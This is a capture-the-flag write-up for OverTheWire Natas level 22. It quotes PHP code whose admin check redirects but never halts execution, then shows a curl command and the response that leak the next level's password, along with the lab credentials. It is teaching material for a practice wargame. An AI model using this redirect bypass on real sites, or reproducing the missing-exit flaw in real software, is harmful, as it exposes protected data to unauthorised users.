# Natas Level 22

> Username: natas22

> Password: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF

> URL: http://natas22.natas.labs.overthewire.org

## Solution

Entering the URL, we found nothing. So let's view the source code to see what's there.

```php
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>

<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

Here we can see if we have the parameter `revelio` in our `GET` request, we’re shown the password. But we can't actually see the password because it redirect us to the main page.

So here you can use `Burp` to intercept and view the response. And you can use `curl` as well.

```shell
curl -i -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF 'http://natas22.natas.labs.overthewire.org/?revelio'
```

```text
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5
```

```text
CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5
```

